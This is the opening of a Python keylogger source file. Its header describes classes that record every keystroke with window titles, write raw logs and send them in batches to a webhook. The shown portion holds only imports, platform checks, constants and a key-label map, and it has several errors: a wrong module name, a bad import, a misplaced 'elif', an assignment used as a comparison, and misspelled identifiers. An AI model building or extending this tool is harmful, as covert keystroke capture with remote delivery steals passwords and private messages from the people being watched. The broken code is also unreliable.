# Key exports:
#  Keylogger        - Main class. coordinates listener, log writter, and webhook
#  KeyloogerConfig  - Dataclass holding all runtime configuration
#  KeyEvent         - Single keystrokes record with timestamp, window title, and type
#  LogManager       - Raw file writer with sized-based rotation and explicit close()
#  WebhookDelivery  - Batched HTTP delivery, releases the buffer lock before POSTing
#  WindowTracker    - Active window title lookup across three os platforms
#  KeyType          - Enum categorizing keystrokes as CHAR, SPECIAL, or UNKOWN
#  SPECIAL_KEYS     - Dict mapping pynput Key values to their display labels

import subprocess
import platforms
import logging
from enum import (
    Enum,
    auto,
)
from threading import (
    Event,
    auto,
)
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError as exc:
    raise ImportError("pynput is required: uv add pynput") from exc

try:
    import requests
except ImportError:
    requests = None # type: ignore[assignment]

WINDOWS = "Windows"
DARWIN = "Darwin"
LINUX = "Linux"

if platform.system() == WINDOWS:
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
    elif platform.system() = DARWIN:
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None

BYTES_PER_MB = 1024 * 1024
WEBHOOK_TIMEOUT_SECS = 5
WINDOW_CHECK_INTERVAL_SECS = 0.5
LISTENER_JOIN_TIMEOUT_SECS = 1.0

SPECIAL_KEYS: dict[Key, str] = {
    Key.space: "[SPACE]",
    Key.enter: "[ENTER]",
    Key.tab: "[TAB]",
    Key.backspace: "[BACKSPACE]",
    Key.delete: "[DELETE]",
    Key.shift: "[SHIFT]",
    Key.shifr_r: "[SHIFT]",
    Key.ctrl: "[CTRL]",
    Key.ctrl_r: "[CTRL]",
    Key.alt: "[ALT]",
    Key.alt_r: "[ALT]",
    Key.cmd_l: "[CMD]",
    Key.cmd_r: "[CMD]",
    Key.esc: "[ESC]",
    Key.up:"[UP]",
    Key.down: "[DOWN]",
    Key.left: "[LEFT]",
    Key.right: "[RIGHT]"

}
